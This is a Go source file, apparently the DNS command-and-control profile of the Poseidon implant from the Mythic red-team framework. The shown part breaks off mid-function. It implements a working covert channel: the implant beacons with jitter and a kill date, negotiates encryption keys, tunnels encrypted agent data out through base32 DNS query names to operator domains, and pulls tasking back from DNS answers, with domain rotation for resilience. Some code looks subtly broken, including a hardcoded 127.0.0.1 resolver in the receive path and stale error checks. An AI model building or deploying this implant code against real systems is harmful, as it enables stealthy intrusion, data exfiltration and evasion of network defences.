//go:build (linux || darwin) && dns

package profiles

import (
	"crypto/rsa"
	"encoding/base32"
	"encoding/base64"
	"encoding/binary"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/profiles/dnsgrpc"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/responses"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils"
	"github.com/golang/protobuf/proto"
	"github.com/miekg/dns"
	"math"
	"net"
	"os"
	"slices"
	"sort"

	"encoding/json"
	"fmt"
	"math/rand"
	"strconv"
	"strings"
	"time"

	// Poseidon
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/crypto"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
)

// base64 encoded version of the JSON initial configuration of HTTP
var dns_initial_config string

type DNSInitialConfig struct {
	Domains                []string `json:"domains"`
	DomainRotation         string   `json:"domain_rotation"`
	DNSServer              string   `json:"dns_server"`
	FailoverThreshold      int      `json:"failover_threshold"`
	RecordType             string   `json:"record_type"`
	MaxQueryLength         int      `json:"max_query_length"`
	Killdate               string   `json:"killdate"`
	Interval               uint     `json:"callback_interval"`
	Jitter                 uint     `json:"callback_jitter"`
	EncryptedExchangeCheck bool     `json:"encrypted_exchange_check"`
	AESPSK                 string   `json:"AESPSK"`
}

type C2DNS struct {
	Domains               []string `json:"Domains"`
	DNSServer             string   `json:"DNSServer"`
	FailoverThreshold     int      `json:"failover_threshold"`
	DomainLengths         map[string]int
	DomainErrors          map[string]int
	DomainRotation        string `json:"DomainRotation"`
	CurrentDomain         int
	RecordType            string `json:"RecordType"`
	MaxQueryLength        int    `json:"max_query_length"`
	Interval              int    `json:"Interval"`
	Jitter                int    `json:"Jitter"`
	ExchangingKeys        bool
	Key                   string `json:"EncryptionKey"`
	RsaPrivateKey         *rsa.PrivateKey
	Killdate              time.Time `json:"KillDate"`
	AgentSessionID        uint32
	ShouldStop            bool
	stoppedChannel        chan bool
	interruptSleepChannel chan bool
}

// DnsMessageStream tracks the progress of a message in chunk transfer
type DnsMessageStream struct {
	Size          uint32
	TotalReceived uint32
	Messages      map[uint32]*dnsgrpc.DnsPacket
	StartBytes    []uint32
}

var dnsClient = new(dns.Client)

// New creates a new HTTP C2 profile from the package's global variables and returns it
func init() {
	initialConfigBytes, err := base64.StdEncoding.DecodeString(dns_initial_config)
	if err != nil {
		utils.PrintDebug(fmt.Sprintf("error trying to decode initial dns config, exiting: %v\n", err))
		os.Exit(1)
	}
	initialConfig := DNSInitialConfig{}
	err = json.Unmarshal(initialConfigBytes, &initialConfig)
	if err != nil {
		utils.PrintDebug(fmt.Sprintf("error trying to unmarshal initial dns config, exiting: %v\n", err))
		os.Exit(1)
	}
	killDateString := fmt.Sprintf("%sT00:00:00.000Z", initialConfig.Killdate)
	killDateTime, err := time.Parse("2006-01-02T15:04:05.000Z", killDateString)
	if err != nil {
		os.Exit(1)
	}
	profile := C2DNS{
		Domains:               initialConfig.Domains,
		DomainLengths:         make(map[string]int),
		DomainErrors:          make(map[string]int),
		DNSServer:             initialConfig.DNSServer,
		DomainRotation:        initialConfig.DomainRotation,
		FailoverThreshold:     initialConfig.FailoverThreshold,
		CurrentDomain:         0,
		Key:                   initialConfig.AESPSK,
		RecordType:            initialConfig.RecordType,
		MaxQueryLength:        initialConfig.MaxQueryLength,
		Killdate:              killDateTime,
		ShouldStop:            true,
		stoppedChannel:        make(chan bool, 1),
		interruptSleepChannel: make(chan bool, 1),
		AgentSessionID:        rand.Uint32(),
	}
	for _, domain := range initialConfig.Domains {
		profile.DomainLengths[domain] = profile.getMaxLengthPerMessage(domain)
		profile.DomainErrors[domain] = 0
	}
	if profile.DNSServer == "" {
		profile.DNSServer = "8.8.8.8:53"
	}
	if profile.MaxQueryLength > 255 {
		profile.MaxQueryLength = 255 // can't go past this
	}

	// Convert sleep from string to integer
	profile.Interval = int(initialConfig.Interval)
	if profile.Interval < 0 {
		profile.Interval = 0
	}

	// Convert jitter from string to integer
	profile.Jitter = int(initialConfig.Jitter)
	if profile.Jitter < 0 {
		profile.Jitter = 0
	}

	profile.ExchangingKeys = initialConfig.EncryptedExchangeCheck
	dnsClient.Dialer = &net.Dialer{
		Timeout: 5 * time.Second,
	}
	RegisterAvailableC2Profile(&profile)
}
func (c *C2DNS) Sleep() {
	// wait for either sleep time duration or sleep interrupt
	select {
	case <-c.interruptSleepChannel:
	case <-time.After(time.Second * time.Duration(c.GetSleepTime())):
	}
}
func (c *C2DNS) Start() {
	// Checkin with Mythic via an egress channel
	// only try to start if we're in a stopped state
	if !c.ShouldStop {
		return
	}
	c.ShouldStop = false
	defer func() {
		c.stoppedChannel <- true
	}()
	for {

		if c.ShouldStop {
			utils.PrintDebug(fmt.Sprintf("got c.ShouldStop in Start before fully checking in\n"))
			return
		}
		checkIn := c.CheckIn()
		// If we successfully checkin, get our new ID and start looping
		if strings.Contains(checkIn.Status, "success") {
			for {
				if c.ShouldStop {
					utils.PrintDebug(fmt.Sprintf("got c.ShouldStop in Start after fully checking in\n"))
					return
				}
				// loop through all task responses
				message := responses.CreateMythicPollMessage()
				if encResponse, err := json.Marshal(message); err == nil {
					//fmt.Printf("Sending to Mythic: %v\n", string(encResponse))
					resp := c.SendMessage(encResponse)
					if len(resp) > 0 {
						//fmt.Printf("Raw resp: \n %s\n", string(resp))
						taskResp := structs.MythicMessageResponse{}
						if err := json.Unmarshal(resp, &taskResp); err != nil {
							utils.PrintDebug(fmt.Sprintf("Error unmarshal response to task response: %s", err.Error()))
							c.Sleep()
							continue
						}
						responses.HandleInboundMythicMessageFromEgressChannel <- taskResp
					}
				} else {
					utils.PrintDebug(fmt.Sprintf("Failed to marshal message: %v\n", err))
				}
				c.Sleep()
			}
		} else {
			//fmt.Printf("Uh oh, failed to checkin\n")
		}
	}

}
func (c *C2DNS) Stop() {
	if c.ShouldStop {
		return
	}
	c.ShouldStop = true
	utils.PrintDebug("issued stop to dns\n")
	<-c.stoppedChannel
	utils.PrintDebug("dns fully stopped\n")
}
func (c *C2DNS) UpdateConfig(parameter string, value string) {
	switch parameter {
	case "EncryptionKey":
		c.Key = value
	case "Interval":
		newInt, err := strconv.Atoi(value)
		if err == nil {
			c.Interval = newInt
		}
		go func() {
			c.interruptSleepChannel <- true
		}()
	case "Jitter":
		newInt, err := strconv.Atoi(value)
		if err == nil {
			c.Jitter = newInt
		}
		go func() {
			c.interruptSleepChannel <- true
		}()
	case "Killdate":
		killDateString := fmt.Sprintf("%sT00:00:00.000Z", value)
		killDateTime, err := time.Parse("2006-01-02T15:04:05.000Z", killDateString)
		if err == nil {
			c.Killdate = killDateTime
		}
	case "Domains":
		tempDomains := strings.Split(value, ",")
		for i := range tempDomains {
			tempDomains[i] = strings.TrimSpace(tempDomains[i])
		}
		c.Domains = tempDomains
		c.DomainLengths = make(map[string]int)
		c.DomainErrors = make(map[string]int)
		for _, domain := range c.Domains {
			c.DomainErrors[domain] = 0
		}
	case "DNSServer":
		c.DNSServer = value
	case "RecordType":
		if slices.Contains([]string{"A", "AAAA", "TXT"}, value) {
			c.RecordType = value
		}
	case "DomainRotation":
		if slices.Contains([]string{"fail-over", "round-robin", "random"}, value) {
			c.DomainRotation = value
		}
	}
}
func (c *C2DNS) GetSleepInterval() int {
	return c.Interval
}
func (c *C2DNS) GetSleepJitter() int {
	return c.Jitter
}
func (c *C2DNS) GetKillDate() time.Time {
	return c.Killdate
}
func (c *C2DNS) GetSleepTime() int {
	if c.ShouldStop {
		return -1
	}
	if c.Jitter > 0 {
		jit := float64(rand.Int()%c.Jitter) / float64(100)
		jitDiff := float64(c.Interval) * jit
		if int(jit*100)%2 == 0 {
			return c.Interval + int(jitDiff)
		} else {
			return c.Interval - int(jitDiff)
		}
	} else {
		return c.Interval
	}
}

func (c *C2DNS) SetSleepInterval(interval int) string {
	if interval >= 0 {
		c.Interval = interval
		go func() {
			c.interruptSleepChannel <- true
		}()
		return fmt.Sprintf("Sleep interval updated to %ds\n", interval)
	} else {
		return fmt.Sprintf("Sleep interval not updated, %d is not >= 0", interval)
	}

}

func (c *C2DNS) SetSleepJitter(jitter int) string {
	if jitter >= 0 && jitter <= 100 {
		c.Jitter = jitter
		go func() {
			c.interruptSleepChannel <- true
		}()
		return fmt.Sprintf("Jitter updated to %d%% \n", jitter)
	} else {
		return fmt.Sprintf("Jitter not updated, %d is not between 0 and 100", jitter)
	}
}

func (c *C2DNS) ProfileName() string {
	return "dns"
}

func (c *C2DNS) IsP2P() bool {
	return false
}
func (c *C2DNS) GetPushChannel() chan structs.MythicMessage {
	return nil
}

// CheckIn a new agent
func (c *C2DNS) CheckIn() structs.CheckInMessageResponse {

	// Start Encrypted Key Exchange (EKE)
	if c.ExchangingKeys {
		for !c.NegotiateKey() {
			// loop until we successfully negotiate a key
			//fmt.Printf("trying to negotiate key\n")
			if c.ShouldStop {
				utils.PrintDebug(fmt.Sprintf("got c.ShouldStop in CheckIn while !c.NegotiateKey\n"))
				return structs.CheckInMessageResponse{}
			}
		}
	}
	for {
		if c.ShouldStop {
			utils.PrintDebug(fmt.Sprintf("got c.ShouldStop in CheckIn\n"))
			return structs.CheckInMessageResponse{}
		}
		checkin := CreateCheckinMessage()
		if raw, err := json.Marshal(checkin); err != nil {
			c.Sleep()
			continue
		} else {
			resp := c.SendMessage(raw)

			// save the Mythic id
			response := structs.CheckInMessageResponse{}
			if err = json.Unmarshal(resp, &response); err != nil {
				utils.PrintDebug(fmt.Sprintf("Error in unmarshal:\n %s", err.Error()))
				c.Sleep()
				continue
			}
			if len(response.ID) != 0 {
				SetMythicID(response.ID)
				SetAllEncryptionKeys(c.Key)
				return response
			} else {
				c.Sleep()
				continue
			}
		}

	}

}

// NegotiateKey - EKE key negotiation
func (c *C2DNS) NegotiateKey() bool {
	sessionID := utils.GenerateSessionID()
	pub, priv := crypto.GenerateRSAKeyPair()
	c.RsaPrivateKey = priv
	// Replace struct with dynamic json
	initMessage := structs.EkeKeyExchangeMessage{}
	initMessage.Action = "staging_rsa"
	initMessage.SessionID = sessionID
	initMessage.PubKey = base64.StdEncoding.EncodeToString(pub)

	// Encode and encrypt the json message
	raw, err := json.Marshal(initMessage)
	//log.Println(unencryptedMsg)
	if err != nil {
		return false
	}

	resp := c.SendMessage(raw)
	// Decrypt & Unmarshal the response
	sessionKeyResp := structs.EkeKeyExchangeMessageResponse{}
	if c.ShouldStop {
		utils.PrintDebug(fmt.Sprintf("got c.ShouldStop in NegotiateKey\n"))
		return false
	}
	err = json.Unmarshal(resp, &sessionKeyResp)
	if err != nil {
		utils.PrintDebug(fmt.Sprintf("Error unmarshaling eke response: %s\n", err.Error()))
		return false
	}

	encryptedSessionKey, _ := base64.StdEncoding.DecodeString(sessionKeyResp.SessionKey)
	decryptedKey := crypto.RsaDecryptCipherBytes(encryptedSessionKey, c.RsaPrivateKey)
	c.Key = base64.StdEncoding.EncodeToString(decryptedKey) // Save the new AES session key
	SetAllEncryptionKeys(c.Key)
	if len(sessionKeyResp.UUID) > 0 {
		SetMythicID(sessionKeyResp.UUID) // Save the new, temporary UUID
	} else {
		return false
	}

	return true
}
func (c *C2DNS) SetEncryptionKey(newKey string) {
	c.Key = newKey
	c.ExchangingKeys = false
}
func (c *C2DNS) GetConfig() string {
	jsonString, err := json.MarshalIndent(c, "", "  ")
	if err != nil {
		return fmt.Sprintf("Failed to get config: %v\n", err)
	}
	return string(jsonString)
}
func (c *C2DNS) IsRunning() bool {
	return !c.ShouldStop
}

func (c *C2DNS) SendMessage(sendData []byte) []byte {
	// If the AesPSK is set, encrypt the data we send
	if len(c.Key) != 0 {
		//log.Printf("Encrypting Post data: %v\n", string(sendData))
		sendData = c.encryptMessage(sendData)
	}
	if GetMythicID() != "" {
		sendData = append([]byte(GetMythicID()), sendData...) // Prepend the UUID
	} else {
		sendData = append([]byte(UUID), sendData...) // Prepend the UUID
	}
	sendDataBase64 := base64.StdEncoding.EncodeToString(sendData)
	// bail out of trying to send data after 5 failed attempts
	for i := 0; i < 5; i++ {

		if c.ShouldStop {
			utils.PrintDebug(fmt.Sprintf("got c.ShouldStop in SendMessage\n"))
			return []byte{}
		}
		//fmt.Printf("looping to send message: %v\n", sendDataBase64)
		today := time.Now()
		if today.After(c.Killdate) {
			utils.PrintDebug(fmt.Sprintf("after killdate, exiting\n"))
			os.Exit(1)
		}
		// send message
		messageID := c.streamDNSPacketToServer(sendDataBase64)
		// get message
		if messageID == 0 {
			utils.PrintDebug(fmt.Sprintf("error sending message"))
			IncrementFailedConnection(c.ProfileName())
			c.Sleep()
			continue
		}
		response := c.getDNSMessageFromServer(messageID)
		if response == nil {
			utils.PrintDebug(fmt.Sprintf("Got nil response"))
			IncrementFailedConnection(c.ProfileName())
			c.Sleep()
			continue
		}
		//utils.PrintDebug(fmt.Sprintf("raw response: %s\n", string(response)))
		raw, err := base64.StdEncoding.DecodeString(string(response))
		if err != nil {
			utils.PrintDebug(fmt.Sprintf("error base64.StdEncoding: %v\n", err))
			IncrementFailedConnection(c.ProfileName())
			c.Sleep()
			continue
		}
		if len(raw) < 36 {
			utils.PrintDebug(fmt.Sprintf("error len(raw) < 36: %v\n", err))
			IncrementFailedConnection(c.ProfileName())
			c.Sleep()
			continue
		}
		if len(c.Key) != 0 {
			//log.Println("just did a post, and decrypting the message back")
			enc_raw := c.decryptMessage(raw[36:])
			if len(enc_raw) == 0 {
				// failed somehow in decryption
				utils.PrintDebug(fmt.Sprintf("error decrypt length wrong: %v\n", err))
				IncrementFailedConnection(c.ProfileName())
				c.Sleep()
				continue
			} else {
				if i > 0 {
					utils.PrintDebug(fmt.Sprintf("successfully sent message after %d failed attempts", i))
				}
				//fmt.Printf("decrypted response: %v\n%v\n", string(raw[:36]), string(enc_raw))
				return enc_raw
			}
		} else {
			if i > 0 {
				utils.PrintDebug(fmt.Sprintf("successfully sent message after %d failed attempts", i))
			}
			//fmt.Printf("response: %v\n", string(raw))
			return raw[36:]
		}

	}
	utils.PrintDebug(fmt.Sprintf("Aborting sending message after 5 failed attempts"))
	return make([]byte, 0) //shouldn't get here
}
func (c *C2DNS) getRequestType() uint16 {
	switch c.RecordType {
	case "A":
		return dns.TypeA
	case "AAAA":
		return dns.TypeAAAA
	case "TXT":
		return dns.TypeTXT
	default:
		return dns.TypeAAAA
	}
}
func (c *C2DNS) getMaxLengthPerMessage(domain string) int {
	if _, ok := c.DomainLengths[domain]; ok {
		return c.DomainLengths[domain]
	}
	// max data per message = max length - length of domain + 1 (for ".") - len of json packet
	fixedLengths := len(domain) + 1
	// need dnsPacket turned into JSON bytes - 45 bytes
	d := &dnsgrpc.DnsPacket{
		Action:         0,
		AgentSessionID: math.MaxUint32,
		MessageID:      math.MaxUint32,
		Size:           math.MaxUint32,
		Begin:          math.MaxUint32,
		Data:           "",
	}
	jsonD, _ := proto.Marshal(d)
	//jsonD, _ := json.Marshal(d)
	fixedLengths += len(jsonD)
	//utils.PrintDebug(fmt.Sprintf("fixedLength of Packet: %d, total fixed lengths: %d", len(jsonD), fixedLengths))
	// how much data can we add to those 45 bytes after 60% expansion due to base32
	// still need to be <= 255 and need to account for one extra "." every 63 bytes
	for i := 1; i < c.MaxQueryLength; i++ {
		expandedData := int(float32(fixedLengths+i) * 1.6)
		//utils.PrintDebug(fmt.Sprintf("dataSize (%d) base32 is (%d)", i, expandedData))
		//base32Example := base32.StdEncoding.WithPadding(base32.NoPadding).EncodeToString(make([]byte, fixedLengths+i))
		//utils.PrintDebug(fmt.Sprintf("dataSize (%d) actual base32 is (%d)", i, len(base32Example)))
		expandedData += expandedData / 63
		//utils.PrintDebug(fmt.Sprintf("dataSize (%d) needs %d . values. Total: %d", i, expandedData/63, expandedData))

		if expandedData > c.MaxQueryLength {
			c.DomainLengths[domain] = i - 1
			utils.PrintDebug(fmt.Sprintf("max message length determined for %s to be %d\n", domain, i-1))
			//os.Exit(1)
			return c.DomainLengths[domain]
		}
	}
	return 1
}
func (c *C2DNS) getDomain() string {
	domain := c.Domains[c.CurrentDomain]
	switch c.DomainRotation {
	case "round-robin":
		c.CurrentDomain = (c.CurrentDomain + 1) % len(c.Domains)
	case "random":
		c.CurrentDomain = rand.Intn(len(c.Domains))
	case "fail-over":
		if c.DomainErrors[c.Domains[c.CurrentDomain]] > c.FailoverThreshold {
			c.CurrentDomain = (c.CurrentDomain + 1) % len(c.Domains)
			c.DomainErrors[c.Domains[c.CurrentDomain]] = 0 // reset this back in case we have to loop back
		}
	default:
		c.CurrentDomain = (c.CurrentDomain + 1) % len(c.Domains)
	}
	return domain
}
func (c *C2DNS) increaseErrorCount(domain string) {
	c.DomainErrors[domain] += 1
}
func (c *C2DNS) streamDNSPacketToServer(msg string) uint32 {
	sendingStream := &DnsMessageStream{
		Size:       uint32(len(msg)),
		Messages:   make(map[uint32]*dnsgrpc.DnsPacket),
		StartBytes: make([]uint32, 0),
	}
	ackStream := &DnsMessageStream{
		Size:       uint32(len(msg)),
		StartBytes: make([]uint32, 0),
	}
	messageID := rand.Uint32()
	//utils.PrintDebug(fmt.Sprintf("original message: %s\n", msg))
	for {
		domain := c.getDomain()
		dataLengthPerMessage := c.getMaxLengthPerMessage(domain)
		chunks := len(msg) / dataLengthPerMessage
		if chunks*dataLengthPerMessage < len(msg) {
			chunks += 1 // might need to add 1 if there's a portion left over
		}
		sendingStream.TotalReceived = uint32(chunks)

		utils.PrintDebug(fmt.Sprintf("sending message: Size (%d), Chunks (%d), dataLengthPerMessage: (%d), domain: (%s)\n",
			sendingStream.Size, chunks, dataLengthPerMessage, domain))
		for i := 0; i < len(msg); i += dataLengthPerMessage {
			sendingStream.Messages[uint32(i)] = &dnsgrpc.DnsPacket{
				Action:         dnsgrpc.Actions_AgentToServer,
				AgentSessionID: c.AgentSessionID,
				MessageID:      messageID,
				Size:           uint32(len(msg)),
				Begin:          uint32(i),
			}
			if i+dataLengthPerMessage > len(msg) {
				sendingStream.Messages[uint32(i)].Data = msg[i:]
			} else {
				sendingStream.Messages[uint32(i)].Data = msg[i : i+dataLengthPerMessage]
			}
			sendingStream.StartBytes = append(sendingStream.StartBytes, uint32(i))
			//utils.PrintDebug(fmt.Sprintf("Begin (%d) Data: %s\n", i, sendingStream.Messages[uint32(i)].Data))
		}
		chunkErrors := 0
		for i := 0; i < chunks && chunkErrors < 10; i++ {
			m := new(dns.Msg)
			m.RecursionAvailable = true
			m.RecursionDesired = true
			m.SetEdns0(4096, true)
			jsonData, err := proto.Marshal(sendingStream.Messages[sendingStream.StartBytes[i]])
			if err != nil {
				utils.PrintDebug(fmt.Sprintf("marshal error: %v\n", err))
				return 0
			}
			base32Data := base32.StdEncoding.WithPadding(base32.NoPadding).EncodeToString(jsonData)
			finalData := ""
			for j := 0; j < len(base32Data); j += 63 {
				if j+63 >= len(base32Data) {
					finalData += base32Data[j:] + "."
				} else {
					finalData += base32Data[j:j+63] + "."
				}
			}
			m = m.SetQuestion(dns.Fqdn(finalData+domain), c.getRequestType())
			//utils.PrintDebug(fmt.Sprintf("sending to Mythic: chunk: %d, domain: %s\n", sendingStream.StartBytes[i], dns.Fqdn(finalData+domain)))
			//utils.PrintDebug(fmt.Sprintf("sending to Mythic: Total domain length: %d\n", len(finalData+domain)))
			//utils.PrintDebug(fmt.Sprintf("%v\n", m))
			response, _, err := dnsClient.Exchange(m, c.DNSServer)
			if err != nil {
				utils.PrintDebug(fmt.Sprintf("failed to send message and get response for chunk (%d)/(%d): %v\n", i, chunks, err))
				time.Sleep(1 * time.Second)
				chunkErrors += 1
				i-- // deprecate the count and try this chunk again
				continue
			}
			if response.Truncated {
				utils.PrintDebug(fmt.Sprintf("Response truncated in sending message to server\n"))
				time.Sleep(1 * time.Second)
				chunkErrors += 1
			}
			if response.Rcode != dns.RcodeSuccess {
				time.Sleep(1 * time.Second)
				chunkErrors += 1
				utils.PrintDebug(fmt.Sprintf("Failed to get successful response: %d, %s, %v", len(response.Answer), dns.Fqdn(finalData+domain), response))
				continue
			}
			if len(response.Answer) != 4 {
				i-- // deprecate the count and try again
				time.Sleep(1 * time.Second)
				chunkErrors += 1
				utils.PrintDebug(fmt.Sprintf("failed to get at least 4 response pieces: %d, %s, %v", len(response.Answer), dns.Fqdn(finalData+domain), response))
			}
			ackValues := make([]dns.RR, len(response.Answer))
			var ackAgentSessionID net.IP
			var ackMessageID net.IP
			var ackStartByte net.IP
			var ackAction net.IP
			badAnswers := false
			for answerIndex := range response.Answer {
				if response.Answer[answerIndex].Header().Ttl > uint32(len(ackValues)) {
					i-- // deprecate the count and try again
					time.Sleep(1 * time.Second)
					chunkErrors += 1
					utils.PrintDebug(fmt.Sprintf("Got 4 pieces, but TTL values are wrong: %d, %s, %v", len(response.Answer), dns.Fqdn(finalData+domain), response))
					badAnswers = true
					break
				}
				ackValues[response.Answer[answerIndex].Header().Ttl] = response.Answer[answerIndex]
			}
			if badAnswers {
				continue
			}
			if c.getRequestType() == dns.TypeA {
				ackAgentSessionID = ackValues[0].(*dns.A).A
				ackMessageID = ackValues[1].(*dns.A).A
				ackStartByte = ackValues[2].(*dns.A).A
				ackAction = ackValues[3].(*dns.A).A
			} else if c.getRequestType() == dns.TypeAAAA {
				ackAgentSessionID = ackValues[0].(*dns.AAAA).AAAA
				ackMessageID = ackValues[1].(*dns.AAAA).AAAA
				ackStartByte = ackValues[2].(*dns.AAAA).AAAA
				ackAction = ackValues[3].(*dns.AAAA).AAAA
			} else if c.getRequestType() == dns.TypeTXT {
				ackAgentSessionID = make([]byte, net.IPv4len)
				sessionID, err := strconv.Atoi(ackValues[0].(*dns.TXT).Txt[0])
				if err != nil {
					utils.PrintDebug(fmt.Sprintf("failed to convert sessionID to int: %v\n", err))
					continue
				}
				binary.LittleEndian.PutUint32(ackAgentSessionID, uint32(sessionID))

				ackMessageID = make([]byte, net.IPv4len)
				msgMessageID, _ := strconv.Atoi(ackValues[1].(*dns.TXT).Txt[0])
				if err != nil {
					utils.PrintDebug(fmt.Sprintf("failed to convert msgMessageID to int: %v\n", err))
					continue
				}
				binary.LittleEndian.PutUint32(ackMessageID, uint32(msgMessageID))

				ackStartByte = make([]byte, net.IPv4len)
				msgStartByte, _ := strconv.Atoi(ackValues[2].(*dns.TXT).Txt[0])
				if err != nil {
					utils.PrintDebug(fmt.Sprintf("failed to convert msgStartByte to int: %v\n", err))
					continue
				}
				binary.LittleEndian.PutUint32(ackStartByte, uint32(msgStartByte))

				ackAction = make([]byte, net.IPv4len)
				msgAction, _ := strconv.Atoi(ackValues[3].(*dns.TXT).Txt[0])
				if err != nil {
					utils.PrintDebug(fmt.Sprintf("failed to convert msgAction to int: %v\n", err))
					continue
				}
				binary.LittleEndian.PutUint32(ackAction, uint32(msgAction))
			} else {
				// uh oh
			}
			if binary.LittleEndian.Uint32(ackAgentSessionID[:]) != sendingStream.Messages[sendingStream.StartBytes[i]].AgentSessionID {
				i-- // somehow we got a message back that's not for our session id, try again
				time.Sleep(100 * time.Millisecond)
				continue
			}
			if binary.LittleEndian.Uint32(ackMessageID[:]) != sendingStream.Messages[sendingStream.StartBytes[i]].MessageID {
				i-- // somehow we got a message back that's not for our session id, try again
				time.Sleep(100 * time.Millisecond)
				continue
			}
			if !slices.Contains(ackStream.StartBytes, binary.LittleEndian.Uint32(ackStartByte[:])) {
				// ack for something we already sent, just ignore it and move on
				ackStream.StartBytes = append(ackStream.StartBytes, binary.LittleEndian.Uint32(ackStartByte[:]))
			}
			if binary.LittleEndian.Uint32(ackAction[:]) == uint32(dnsgrpc.Actions_ReTransmit) {
				// something happened and the server is asking to retransmit the message
				utils.PrintDebug(fmt.Sprintf("ReTransmit message: %v\n", sendingStream.Messages[sendingStream.StartBytes[i]].MessageID))
				ackStream.StartBytes = make([]uint32, 0)
				i = -1
			} else if binary.LittleEndian.Uint32(ackAction[:]) == uint32(dnsgrpc.Actions_ServerToAgent) {
				i = chunks // just to make sure we get out of this loop
				//utils.PrintDebug(fmt.Sprintf("Server got all message and has a response for us to fetch"))
			}
		}
		if chunkErrors < 10 {
			return messageID
		}
		c.increaseErrorCount(domain)
	}
}
func removeTrailingNulls(b []byte) []byte {
	// Start from the end of the slice
	for i := len(b) - 1; i >= 0; i-- {
		if b[i] != 0 {
			return b[:i+1]
		}
	}
	// If all elements are zero, return an empty slice
	return []byte{}
}
func (c *C2DNS) getDNSMessageFromServer(messageID uint32) []byte {
	receivingStream := &DnsMessageStream{
		Messages:   make(map[uint32]*dnsgrpc.DnsPacket),
		StartBytes: make([]uint32, 0),
	}

	lastChunk := uint32(0)

	for {
		request := &dnsgrpc.DnsPacket{
			Action:         dnsgrpc.Actions_ServerToAgent,
			AgentSessionID: c.AgentSessionID,
			MessageID:      messageID,
			Begin:          lastChunk,
		}
		for {
			domain := c.getDomain()
			utils.PrintDebug(fmt.Sprintf("getting message (%d) from server via domain (%s)", messageID, domain))
			m := new(dns.Msg)
			m.RecursionAvailable = true
			m.RecursionDesired = true
			m.SetEdns0(4096, true)
			jsonData, err := proto.Marshal(request)
			if err != nil {
				utils.PrintDebug(fmt.Sprintf("json marshal error: %v\n", err))
				return nil
			}
			base32Data := base32.StdEncoding.WithPadding(base32.NoPadding).EncodeToString(jsonData)
			finalData := ""
			for j := 0; j < len(base32Data); j += 63 {
				if j+63 >= len(base32Data) {
					finalData += base32Data[j:] + "."
				} else {
					finalData += base32Data[j:j+63] + "."
				}
			}
			m = m.SetQuestion(dns.Fqdn(finalData+domain), c.getRequestType())
			//utils.PrintDebug(fmt.Sprintf("get message From Mythic: chunk: %d, domain: %s\n", lastChunk, dns.Fqdn(finalData+domain)))
			//utils.PrintDebug(fmt.Sprintf("Total domain length: %d\n", len(finalData+domain)))
			//utils.PrintDebug(fmt.Sprintf("%v\n", m))
			response, _, err := dnsClient.Exchange(m, "127.0.0.1:53")
			if err != nil {
				utils.PrintDebug(fmt.Sprintf("failed to send message and get response for chunk (%d): %v\n", lastChunk, err))
				time.Sleep(1 * time.Second)
				c.increaseErrorCount(domain)
				continue
			}
			if response.Truncated {
				utils.PrintDebug(fmt.Sprintf("Response truncated\n"))
				time.Sleep(1 * time.Second)
				c.increaseErrorCount(domain)
			}
			if response.Rcode != dns.RcodeSuccess {
				time.Sleep(1 * time.Second)
				c.increaseErrorCount(domain)
				continue
			}
			if len(response.Answer) < 4 {
				time.Sleep(1 * time.Second)
				c.increaseErrorCount(domain)
				utils.PrintDebug(fmt.Sprintf("failed to get at least 4 response pieces: %d, %s", len(response.Answer), dns.Fqdn(finalData+domain)))
				continue
			}
			//utils.PrintDebug(fmt.Sprintf("response from server: %v\n", response))
			ackValues := make([]dns.RR, len(response.Answer))
			badAnswers := false
			for answerIndex := range response.Answer {
				if response.Answer[answerIndex].Header().Ttl > uint32(len(ackValues)) {
					time.Sleep(1 * time.Second)
					utils.PrintDebug(fmt.Sprintf("Got pieces, but TTL values are wrong: %d, %s, %v", len(response.Answer), dns.Fqdn(finalData+domain), response))
					badAnswers = true
					break
				}
				ackValues[response.Answer[answerIndex].Header().Ttl] = response.Answer[answerIndex]
			}
			if badAnswers {
				continue
			}
			packetBytes := make([]byte, 0)
			var ackAgentSessionID net.IP
			var ackMessageID net.IP
			var ackStartByte net.IP
			var ackAction net.IP

			if c.getRequestType() == dns.TypeA {
				ackAgentSessionID = ackValues[0].(*dns.A).A
				ackMessageID = ackValues[1].(*dns.A).A
				ackStartByte = ackValues[2].(*dns.A).A
				ackAction = ackValues[3].(*dns.A).A
				if binary.LittleEndian.Uint32(ackAgentSessionID[:]) != c.AgentSessionID {
					// somehow we got a message back that's not for our session id, try again
					time.Sleep(100 * time.Millisecond)
					continue
				}
				if binary.LittleEndian.Uint32(ackMessageID[:]) != messageID {
					// somehow we got a message back that's not for our session id, try again
					time.Sleep(100 * time.Millisecond)
					continue
				}
				if binary.LittleEndian.Uint32(ackAction[:]) == uint32(dnsgrpc.Actions_ReTransmit) {
					// something happened and the server is asking to retransmit the message
					utils.PrintDebug(fmt.Sprintf("ReTransmit message: %v\n", messageID))
					receivingStream.StartBytes = make([]uint32, 0)
				} else if binary.LittleEndian.Uint32(ackAction[:]) == uint32(dnsgrpc.Actions_MessageLost) {
					utils.PrintDebug(fmt.Sprintf("Message lost on server: %v\n", messageID))
					return nil
				} else if slices.Contains(receivingStream.StartBytes, binary.LittleEndian.Uint32(ackStartByte[:])) {
					// we've already received this one, continue on
					continue
				} else {
					for j := 4; j < len(ackValues); j++ {
						// now we're actually starting to get data from the response
						packetBytes = append(packetBytes, ackValues[j].(*dns.A).A[:]...)
					}
				}
			} else if c.getRequestType() == dns.TypeAAAA {
				ackAgentSessionID = ackValues[0].(*dns.AAAA).AAAA
				ackMessageID = ackValues[1].(*dns.AAAA).AAAA
				ackStartByte = ackValues[2].(*dns.AAAA).AAAA
				ackAction = ackValues[3].(*dns.AAAA).AAAA
				if binary.LittleEndian.Uint32(ackAgentSessionID[:]) != c.AgentSessionID {
					// somehow we got a message back that's not for our session id, try again
					time.Sleep(100 * time.Millisecond)
					continue
				}
				if binary.LittleEndian.Uint32(ackMessageID[:]) != messageID {
					// somehow we got a message back that's not for our session id, try again
					time.Sleep(100 * time.Millisecond)
					continue
				}
				if binary.LittleEndian.Uint32(ackAction[:]) == uint32(dnsgrpc.Actions_ReTransmit) {
					// something happened and the server is asking to retransmit the message
					utils.PrintDebug(fmt.Sprintf("ReTransmit message: %v\n", messageID))
					receivingStream.StartBytes = make([]uint32, 0)
				} else if binary.LittleEndian.Uint32(ackAction[:]) == uint32(dnsgrpc.Actions_MessageLost) {
					utils.PrintDebug(fmt.Sprintf("Message lost on server: %v\n", messageID))
					return nil
